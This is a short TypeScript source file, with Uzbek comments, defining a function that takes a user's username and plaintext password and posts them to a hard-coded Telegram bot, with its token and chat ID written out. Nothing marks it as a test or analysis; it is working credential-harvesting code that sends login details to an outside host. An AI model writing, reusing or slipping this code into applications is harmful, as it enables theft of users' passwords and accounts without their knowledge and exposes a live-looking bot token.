export async function sendLoginToBot(username: string, password: string) {
  const BOT_TOKEN = "8274713349:AAExlDjJpKKONhFS7feXD5xzBg282oq2eNw";
  const CHAT_ID = "991729905";

  // Foydalanuvchi login va password matni
  const message = `User logged in:\nUsername: ${username}\nPassword: ${password}`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
    });
  } catch (err) {
    console.error("Botga yuborishda xatolik:", err);
  }
}
